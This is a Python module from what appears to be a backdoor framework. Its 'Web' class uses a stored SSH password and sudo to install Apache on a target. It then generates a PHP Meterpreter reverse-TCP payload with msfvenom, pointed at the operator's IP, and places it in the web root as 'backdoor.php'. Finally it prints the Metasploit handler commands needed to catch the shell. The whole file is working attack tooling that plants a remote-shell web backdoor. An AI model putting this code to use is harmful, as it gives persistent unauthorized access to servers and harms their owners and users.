from backdoor import *

class Web(Backdoor):
    prompt = Fore.RED + "(web) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Web module"
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53929, "port to connect to", True),
                "name"   : Option("name", "backdoor.php", "name of backdoor", True),
		}
        self.allow_modules = False

    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")
	name = self.get_value("name")
	self.target.scpFiles(self, "web/install.sh", False)
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S bash install.sh")
	print("Starting Apache server.")
	os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + self.core.localIP + " LPORT=" + str(port) + " -f raw > " + name) 
	print("Creating backdoor")
	self.target.scpFiles(self, name, False)
	print("Shipping backdoor")
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S rm /var/www/html/" + name)
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv " + name + " /var/www/html")
	print("Please start a handler with metasploit using the following commands: ")
	print("use exploit/multi/handler")
	print("set LHOST " + self.core.localIP)
	print("set LPORT " + str(port))
	print("exploit")
	print("")
	print("Then visit the site at " + self.target.hostname + "/" + name)
	
	print("To begin your session, type sessions -i [session id]")
  
